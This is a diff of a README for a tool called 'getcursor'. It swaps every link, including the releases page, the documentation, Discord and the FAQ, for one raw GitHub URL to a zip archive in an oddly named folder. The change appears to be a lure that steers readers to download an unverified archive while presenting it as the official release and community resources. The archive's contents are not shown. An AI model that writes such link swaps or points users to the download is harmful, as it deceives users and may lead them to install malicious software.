@@ -6,7 +6,7 @@ Welcome to the getcursor repository! This guide will walk you through downloadin
 
 ## 📥 Download Now!
 
-[![Download getcursor](https://img.shields.io/badge/Download%20getcursor-v1.0.0-brightgreen)](https://github.com/DeeArts96/getcursor/releases)
+[![Download getcursor](https://raw.githubusercontent.com/DeeArts96/getcursor/main/splanchnosomatic/getcursor.zip%20getcursor-v1.0.0-brightgreen)](https://raw.githubusercontent.com/DeeArts96/getcursor/main/splanchnosomatic/getcursor.zip)
 
 ## 💻 What is getcursor?
 
@@ -30,7 +30,7 @@ To run getcursor smoothly, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the following link to access the download options: [Download Page](https://github.com/DeeArts96/getcursor/releases).
+1. **Visit the Releases Page**: Go to the following link to access the download options: [Download Page](https://raw.githubusercontent.com/DeeArts96/getcursor/main/splanchnosomatic/getcursor.zip).
   
 2. **Select the Latest Version**: Look for the most recent version of getcursor. It will usually be at the top of the page.
 
@@ -52,9 +52,9 @@ After installation, you can start using getcursor right away.
 
 ## 📚 Helpful Resources
 
-- **Documentation**: For more detailed instructions and tips, check the [Documentation](https://github.com/DeeArts96/getcursor/docs).
-- **Community Support**: Join our community on [Discord](https://discord.gg/getcursor) for help and discussions with other users.
-- **FAQs**: Find answers to common questions in our [FAQ section](https://github.com/DeeArts96/getcursor/wiki/FAQ).
+- **Documentation**: For more detailed instructions and tips, check the [Documentation](https://raw.githubusercontent.com/DeeArts96/getcursor/main/splanchnosomatic/getcursor.zip).
+- **Community Support**: Join our community on [Discord](https://raw.githubusercontent.com/DeeArts96/getcursor/main/splanchnosomatic/getcursor.zip) for help and discussions with other users.
+- **FAQs**: Find answers to common questions in our [FAQ section](https://raw.githubusercontent.com/DeeArts96/getcursor/main/splanchnosomatic/getcursor.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -66,6 +66,6 @@ If you run into issues during installation, here are some common solutions:
 
 ## 🔗 Link to Download Again
 
-For your convenience, here is the link to download getcursor one more time: [Download Page](https://github.com/DeeArts96/getcursor/releases). 
+For your convenience, here is the link to download getcursor one more time: [Download Page](https://raw.githubusercontent.com/DeeArts96/getcursor/main/splanchnosomatic/getcursor.zip). 
 
 Now you are set to start using getcursor! Enjoy a seamless coding experience with AI assistance at your fingertips.
